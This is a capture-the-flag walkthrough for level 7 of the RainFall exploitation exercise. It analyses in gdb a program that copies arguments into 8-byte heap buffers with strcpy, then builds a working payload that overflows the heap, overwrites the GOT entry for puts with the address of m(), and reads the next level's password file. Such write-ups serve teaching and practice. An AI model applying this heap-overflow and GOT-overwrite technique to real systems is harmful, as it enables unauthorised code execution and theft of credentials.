# Level7 Walkthrough

## Analyzing the Program with GDB

1. **Disassemble the program functions aka whats happening there**:
   Using the command `info functions`  and `disas`, we found several functions :
   - main() : every str is malloc with only 8bytes and the argv[1] and argv[2] is respectively copied with strcpy but without veryfying the len, so we can write above the limit allocated.
   - m() : this function is reading the c[68] buffer which is the variable that has the password. 

   `Purpose is to read c[68] from m() function instead of puts`

## Running the program

1. **Execute the Program with the Correct Input**:  
   We ran the program with the following command:  
   ```bash
    level7@RainFall:~$ ./level7 
    Segmentation fault (core dumped)
    level7@RainFall:~$ ./level7 hello
    Segmentation fault (core dumped)
    level7@RainFall:~$ ./level7 hello world
    ~~
   ```
    The program segfaults if the user does not insert two arguments. In this case, it prints `~~`

2. **Trying to overflow the RET value**
    
    - Find the offset by padding: 
    
    ```bash
    gdb ./level7
    (gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

    (gdb) info register eax
    eax            0x37614136       929120566
    ```

    we find that the overflow starts at `7aA6` but upside down `6Aa7` in our input string, which represent an offset `20`.

    - We then need to find the puts() address, that will be the pointer to overwrite.
    ```bash
    (gdb) info function puts
    All functions matching regular expression "puts":

    Non-debugging symbols:
    0x08048400  puts
    0x08048400  puts@plt
    (gdb) disas 0x08048400
    Dump of assembler code for function puts@plt:
    0x08048400 <+0>:     jmp    *0x8049928
    0x08048406 <+6>:     push   $0x28
    0x0804840b <+11>:    jmp    0x80483a0
    End of assembler dump.
    ```

    ```bash
    Première Appel à puts:

    Le programme saute à 0x80483a0 via la PLT (procedure linkage table)
    'linstruction push $0x28 est utilisée pour transmettre un index spécifique au linker dynamique.
    Le linker détermine que l'index 0x28 correspond à puts, résout son adresse dans la bibliothèque partagée, et met cette adresse dans la GOT (global offset table).
    
    Appels Suivants à puts:

    Le programme saute directement à 'ladresse stockée dans la GOT (0x8049928), qui pointe maintenant vers la vraie fonction puts dans libc.
    ```

    So, the address of puts  is `*0x8049928` and in little-endian it is : `\x28\x99\x04\x08`

    - Test with ltrace : [ltrace is a function that can trace functions calls]
    ```bash
    level7@RainFall:~$ ltrace ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') hello
    __libc_start_main(0x8048521, 3, 0xbffff7c4, 0x8048610, 0x8048680 <unfinished ...>
    malloc(8)                                        = 0x0804a008
    malloc(8)                                        = 0x0804a018
    malloc(8)                                        = 0x0804a028
    malloc(8)                                        = 0x0804a038
    strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAA(\231\004\b") = 0x0804a018
    strcpy(0x08049928, "hello")                      = 0x08049928
    fopen("/home/user/level8/.pass", "r")            = 0
    fgets( <unfinished ...>
    --- SIGSEGV (Segmentation fault) ---
    +++ killed by SIGSEGV +++
    ```

    Now we need the address of m() with `info function m` : `0x080484f4`

    So, the address of m() in little-endian : `\xf4\x84\x04\x08`

    - Now we can use this payload to get the password :
    `./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')`

## Moving to level8

1. **Swith User to level8**:
    Run ```su level8```

2. **Authenticate with the Password**:
    We used the password we found.